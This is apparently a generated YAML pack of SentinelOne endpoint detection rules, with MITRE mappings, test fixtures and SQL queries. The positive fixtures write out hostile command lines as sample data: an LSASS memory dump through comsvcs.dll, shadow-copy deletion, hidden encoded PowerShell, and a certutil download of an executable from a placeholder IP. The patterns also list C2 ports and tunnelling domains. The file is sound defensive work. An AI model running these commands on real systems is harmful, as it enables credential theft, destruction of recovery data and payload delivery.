# Generated by scripts/gen_rule_packs.py - edit there, then re-run it.
pack_id: sentinelone
name: SentinelOne
vendor: SentinelOne
version: 1
description: "SentinelOne detections: native high-severity alerts plus behavioural rules (macro droppers, encoded PowerShell, LSASS dumps, recovery deletion, LOLBin downloads, C2 ports, tunnelling DNS, Startup persistence). The Sigma endpoint pack runs on the same data."
requires: [{"table": "ENDPOINT_PROCESSES", "vendor_product": "SentinelOne"}]
onboarding: "Enable Singularity Cloud Funnel to S3 and poll the threats API with otel-receiver/collector-examples/sentinelone_funnel.py (service.name sentinelone)."
rules:
  - id: SONE-001
    name: "SentinelOne: high-severity native detection"
    description: "The EDR raised a high or critical detection; correlated with every other source."
    severity: 4
    tactic: "TA0002"
    technique: "T1204"
    table: "INTRUSION_DETECTION"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "sentinelone", "body": {"threatInfo": {"threatName": "Credential Theft", "classification": "lsass dump", "confidenceLevel": "malicious", "threatId": "t1", "processUser": "CORP\\{{entity}}"}, "agentRealtimeInfo": {"agentComputerName": "WS-{{entity}}"}}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "sentinelone", "body": {"threatInfo": {"threatName": "Credential Theft", "classification": "lsass dump", "confidenceLevel": "suspicious", "threatId": "t1", "processUser": "CORP\\{{entity}}"}, "agentRealtimeInfo": {"agentComputerName": "WS-{{entity}}"}}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, dest AS user_name, src, src AS dest, signature AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.INTRUSION_DETECTION
      WHERE vendor_product = 'SentinelOne' AND severity >= 4

  - id: SONE-002
    name: "Office application spawned a shell"
    description: "Word, Excel, PowerPoint or Outlook started cmd, PowerShell or a script host: the classic macro dropper."
    severity: 4
    tactic: "TA0001"
    technique: "T1566.001"
    table: "ENDPOINT_PROCESSES"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "Process Creation", "tgt.process.image.path": "C:\\Windows\\System32\\cmd.exe", "tgt.process.cmdline": "cmd.exe /c whoami", "src.process.image.path": "C:\\Windows\\WINWORD.EXE", "tgt.process.pid": 4242, "tgt.process.user": "CORP\\{{entity}}"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "Process Creation", "tgt.process.image.path": "C:\\Windows\\System32\\cmd.exe", "tgt.process.cmdline": "cmd.exe /c whoami", "src.process.image.path": "C:\\Windows\\explorer.exe", "tgt.process.pid": 4242, "tgt.process.user": "CORP\\{{entity}}"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, process_name AS src, dest, process_name || ' on ' || dest || ': ' || LEFT(process, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES
      WHERE vendor_product = 'SentinelOne' AND (parent_process_name IN ('winword.exe', 'excel.exe', 'powerpnt.exe', 'outlook.exe') AND process_name IN ('cmd.exe', 'powershell.exe', 'pwsh.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe'))

  - id: SONE-003
    name: "Encoded PowerShell command"
    description: "PowerShell started with an encoded command, used to hide payloads."
    severity: 3
    tactic: "TA0002"
    technique: "T1059.001"
    table: "ENDPOINT_PROCESSES"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "Process Creation", "tgt.process.image.path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "tgt.process.cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgA", "src.process.image.path": "C:\\Windows\\explorer.exe", "tgt.process.pid": 4242, "tgt.process.user": "CORP\\{{entity}}"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "Process Creation", "tgt.process.image.path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "tgt.process.cmdline": "powershell.exe -File C:\\scripts\\backup.ps1", "src.process.image.path": "C:\\Windows\\explorer.exe", "tgt.process.pid": 4242, "tgt.process.user": "CORP\\{{entity}}"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, process_name AS src, dest, process_name || ' on ' || dest || ': ' || LEFT(process, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES
      WHERE vendor_product = 'SentinelOne' AND (process_name IN ('powershell.exe', 'pwsh.exe') AND REGEXP_LIKE(process, '.*\\s-(e|en|enc|enco|encodedcommand)\\s.*', 'i'))

  - id: SONE-004
    name: "LSASS memory dump"
    description: "comsvcs.dll MiniDump or procdump against lsass: credential theft."
    severity: 5
    tactic: "TA0006"
    technique: "T1003.001"
    table: "ENDPOINT_PROCESSES"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "Process Creation", "tgt.process.image.path": "C:\\Windows\\System32\\rundll32.exe", "tgt.process.cmdline": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full", "src.process.image.path": "C:\\Windows\\explorer.exe", "tgt.process.pid": 4242, "tgt.process.user": "CORP\\{{entity}}"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "Process Creation", "tgt.process.image.path": "C:\\Windows\\System32\\rundll32.exe", "tgt.process.cmdline": "rundll32.exe shell32.dll,Control_RunDLL", "src.process.image.path": "C:\\Windows\\explorer.exe", "tgt.process.pid": 4242, "tgt.process.user": "CORP\\{{entity}}"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, process_name AS src, dest, process_name || ' on ' || dest || ': ' || LEFT(process, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES
      WHERE vendor_product = 'SentinelOne' AND ((process ILIKE '%comsvcs%' AND process ILIKE '%minidump%') OR (process_name IN ('procdump.exe', 'procdump64.exe') AND process ILIKE '%lsass%'))

  - id: SONE-005
    name: "Shadow copies or backups deleted"
    description: "vssadmin / wmic / wbadmin used to delete recovery data: a ransomware precursor."
    severity: 5
    tactic: "TA0040"
    technique: "T1490"
    table: "ENDPOINT_PROCESSES"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "Process Creation", "tgt.process.image.path": "C:\\Windows\\System32\\vssadmin.exe", "tgt.process.cmdline": "vssadmin.exe delete shadows /all /quiet", "src.process.image.path": "C:\\Windows\\explorer.exe", "tgt.process.pid": 4242, "tgt.process.user": "CORP\\{{entity}}"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "Process Creation", "tgt.process.image.path": "C:\\Windows\\System32\\vssadmin.exe", "tgt.process.cmdline": "vssadmin.exe list shadows", "src.process.image.path": "C:\\Windows\\explorer.exe", "tgt.process.pid": 4242, "tgt.process.user": "CORP\\{{entity}}"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, process_name AS src, dest, process_name || ' on ' || dest || ': ' || LEFT(process, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES
      WHERE vendor_product = 'SentinelOne' AND ((process_name = 'vssadmin.exe' AND process ILIKE '%delete%shadows%') OR (process_name = 'wmic.exe' AND process ILIKE '%shadowcopy%delete%') OR (process_name = 'wbadmin.exe' AND process ILIKE '%delete%catalog%'))

  - id: SONE-006
    name: "Living-off-the-land download"
    description: "certutil or bitsadmin used to fetch a file from the internet."
    severity: 3
    tactic: "TA0011"
    technique: "T1105"
    table: "ENDPOINT_PROCESSES"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "Process Creation", "tgt.process.image.path": "C:\\Windows\\System32\\certutil.exe", "tgt.process.cmdline": "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\\Users\\Public\\a.exe", "src.process.image.path": "C:\\Windows\\explorer.exe", "tgt.process.pid": 4242, "tgt.process.user": "CORP\\{{entity}}"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "Process Creation", "tgt.process.image.path": "C:\\Windows\\System32\\certutil.exe", "tgt.process.cmdline": "certutil.exe -verify cert.cer", "src.process.image.path": "C:\\Windows\\explorer.exe", "tgt.process.pid": 4242, "tgt.process.user": "CORP\\{{entity}}"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, process_name AS src, dest, process_name || ' on ' || dest || ': ' || LEFT(process, 200) AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES
      WHERE vendor_product = 'SentinelOne' AND ((process_name = 'certutil.exe' AND process ILIKE '%urlcache%' AND process ILIKE '%http%') OR (process_name = 'bitsadmin.exe' AND process ILIKE '%/transfer%'))

  - id: SONE-007
    name: "Connection to a common C2 port"
    description: "A system binary connected out to a port typical of reverse shells and C2 frameworks."
    severity: 3
    tactic: "TA0011"
    technique: "T1571"
    table: "NETWORK_TRAFFIC"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "IP Connect", "dst.ip.address": "203.0.113.66", "dst.port.number": 4444, "src.ip.address": "10.0.0.5", "src.port.number": 50123, "event.network.direction": "OUTGOING", "src.process.image.path": "C:\\Windows\\System32\\rundll32.exe"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "IP Connect", "dst.ip.address": "203.0.113.66", "dst.port.number": 443, "src.ip.address": "10.0.0.5", "src.port.number": 50123, "event.network.direction": "OUTGOING", "src.process.image.path": "C:\\Windows\\System32\\rundll32.exe"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, src AS user_name, src, dest, app || ' -> ' || dest_ip || ':' || dest_port AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.NETWORK_TRAFFIC
      WHERE vendor_product = 'SentinelOne' AND (direction = 'outbound' OR direction = 'outgoing') AND dest_port IN (4444, 1337, 8443, 50050, 31337) AND app IN ('rundll32.exe', 'regsvr32.exe', 'powershell.exe', 'mshta.exe', 'cmd.exe')

  - id: SONE-008
    name: "DNS to a tunnelling or dynamic-DNS service"
    description: "A host resolved an ngrok, trycloudflare or dynamic-DNS name often used for C2 and exfiltration."
    severity: 3
    tactic: "TA0011"
    technique: "T1572"
    table: "DNS_ACTIVITY"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "DNS Resolved", "event.dns.request": "a1b2.ngrok-free.app", "src.process.image.path": "C:\\Windows\\System32\\powershell.exe"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "DNS Resolved", "event.dns.request": "login.microsoftonline.com", "src.process.image.path": "C:\\Windows\\System32\\powershell.exe"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, src AS user_name, src, dest, query AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.DNS_ACTIVITY
      WHERE vendor_product = 'SentinelOne' AND REGEXP_LIKE(query, '.*\\.(ngrok\\.io|ngrok-free\\.app|trycloudflare\\.com|duckdns\\.org|no-ip\\.org|serveo\\.net)$', 'i')

  - id: SONE-009
    name: "Executable dropped in a Startup folder"
    description: "A program, script or shortcut was written to a Startup folder so it runs at every logon."
    severity: 4
    tactic: "TA0003"
    technique: "T1547.001"
    table: "ENDPOINT_FILESYSTEM"
    threshold: 1
    window_minutes: 60
    lookback_minutes: 240
    expected_latency_seconds: 600
    fixtures: {"positive": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "File Creation", "tgt.file.path": "C:\\Users\\x\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\upd.exe", "src.process.image.path": "C:\\Windows\\System32\\powershell.exe"}}, "count": 1, "offset_minutes": 1}], "negative": [{"otel": {"service_name": "sentinelone", "body": {"endpoint.name": "WS-{{entity}}", "endpoint.os": "windows", "src.process.user": "CORP\\{{entity}}", "event.type": "File Creation", "tgt.file.path": "C:\\Users\\x\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notes.txt", "src.process.image.path": "C:\\Windows\\System32\\powershell.exe"}}, "count": 1, "offset_minutes": 1}]}
    sql: |
      SELECT _time, user_name, process_name AS src, dest, file_path AS description
      FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_FILESYSTEM
      WHERE vendor_product = 'SentinelOne' AND CONTAINS(LOWER(file_path), '\\start menu\\programs\\startup\\') AND REGEXP_LIKE(file_path, '.*\\.(exe|lnk|bat|cmd|vbs|js|ps1|hta)$', 'i')

